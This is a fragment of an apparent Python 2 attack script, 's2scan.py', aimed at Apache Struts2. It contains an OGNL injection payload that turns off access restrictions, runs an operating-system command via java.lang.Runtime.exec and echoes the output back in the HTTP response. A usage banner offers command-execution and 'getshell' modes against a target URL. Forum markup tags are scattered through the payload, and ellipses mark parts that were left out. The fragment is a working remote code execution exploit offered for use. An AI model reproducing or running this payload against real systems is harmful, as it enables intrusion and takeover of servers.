...
try:
    ...
    payload_005 = [r"?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\[email]75@java.util.Collections[/email]@EMPTY_SET')(c))&(g)(('\43mycmd\75\'","id",r"\'')(d))&(h)(('\43myret\[email]75@java.lang.Runtime[/email]@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\[email]75@org.apache.struts2.ServletActionContext[/email]@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"]
    ...
    print """
             ...
             python s2scan.py --url [url]http://xxxx.com/index.action[/url]
             python s2scan.py --cmd [url]http://xxxx.com/index.action[/url]
             python s2scan.py --getshell [url]http://xxxx.com/index.action[/url]
          """